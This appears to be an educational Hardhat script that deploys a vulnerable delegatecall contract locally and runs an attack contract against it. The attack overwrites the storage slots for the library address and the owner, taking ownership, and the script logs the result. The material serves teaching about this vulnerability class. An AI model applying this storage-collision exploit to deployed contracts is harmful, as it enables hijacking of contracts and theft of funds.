//
// @dev Simulate a delegatecall changing storage variable attack
// @description Compared with contracts/Delegatecall.sol attack sample, this sample
// foucses on how delegatecall func change a variable based on variable's slot.
// We use AttackDelegateV2's setNum func to simulate Lib's setNum func in our
// sample.
// `delegate.doSomething(uint256(uint160(address(this))))` changes DelegateControlV2's
// address variable {lib}
// `delegate.doSomething(1)` delegatecalls AttackDelegateV2's setNum. So that's
// why we simulate a `setNum()` func in attack contract.
//
// @reference https://learnblockchain.cn/article/4281
//

const { ethers } = require('hardhat');

const main = async () => {
    const [ owner, attacker ] = await ethers.getSigners();
    const Lib = await ethers.getContractFactory('Lib', owner);
    const lib = await Lib.deploy();
    await lib.deployed();

    const DelegateControl = await ethers.getContractFactory('DelegateControlV2', owner);
    const delegate = await DelegateControl.deploy(lib.address);
    await delegate.deployed();

    const Attack = await ethers.getContractFactory('AttackDelegateV2', attacker);
    const attack = await Attack.deploy(delegate.address);
    await attack.deployed();

    console.log(`==== Deployed contract ====`);
    console.log(`owner:\n  Lib:\t\t     ${lib.address}\n  DelegateControlV2: ${delegate.address}\n`);
    console.log(`attacker:\n  AttackDelegateV2:  ${attack.address}\n`);

    console.log(`==== Owner playes game ====`);
    console.log(`Owner check DelegateControl's lib var:   ${await delegate.connect(owner).lib()}`);
    console.log(`Owner check DelegateControl's owner var: ${await delegate.connect(owner).owner()}\n`);

    console.log(`==== Attacker attacks game ====`);
    console.log(`Attacker start attacking delegate game...`);
    await attack.connect(attacker).changeYourOwner();
    console.log(`recheck DelegateControl's lib var:   ${await delegate.connect(owner).lib()}`);
    console.log(`recheck DelegateControl's owner var: ${await delegate.connect(owner).owner()}`);
    console.log(`Do u say, my bro, DelegateControl's lib and owner var is changed as AttackDelegateV2's contract address:)`);
    
}

main()
    .then(() => process.exit(0))
    .catch((err) => {
        console.error(err);
        process.exit(1);
    });